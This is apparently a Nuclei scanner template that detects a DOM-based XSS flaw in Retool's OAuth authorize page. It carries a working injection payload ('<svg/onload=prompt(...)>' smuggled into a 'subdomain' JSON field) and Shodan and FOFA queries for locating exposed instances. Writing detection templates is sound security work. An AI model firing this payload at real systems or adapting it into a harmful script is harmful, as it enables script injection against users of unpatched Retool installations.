headless:
- matchers:
  - condition: and
    dsl:
    - subdomain_object_dom == true
    - subdomain_object_dom_message == random_int
    type: dsl
  matchers-condition: and
  steps:
  - action: navigate
    args:
      url: '{{BaseURL}}/oauth/authorize#%7B%20"redirectUri":%20"zzz",%20"resourceId":%20"fff",%20"resourceName":%20"aa",%20"resourceType":%20"azz",%20"userEmail":%20"aaa@aa.com",%20"userFirstName":%20"zzz",%20"userLastName":%20"zzff",%20"xsrfToken":%20"x","subdomain":"aaa<svg/onload=prompt({{random_int}})>aaaa","accessToken":"ab"%20%7D'
  - action: waitdialog
    name: subdomain_object_dom
id: retool-dom-xss
info:
  author: rootxharsh,iamnoooob,pdresearch
  description: 'Retool versions less than 3.82.0-Edge are vulnerable to a DOM-based
    XSS vulnerability in the OAuth authorization flow.

    '
  metadata:
    fofa-query: body="Retool"
    max-request: 1
    shodan-query: title:"Retool"
    verified: true
  name: Retool <3.82.0 Edge OAuth Authorize - DOM Based XSS
  severity: high
  tags: headless,retool,dom,xss,vuln
variables:
  random_int: '{{rand_int(1,1000)}}'
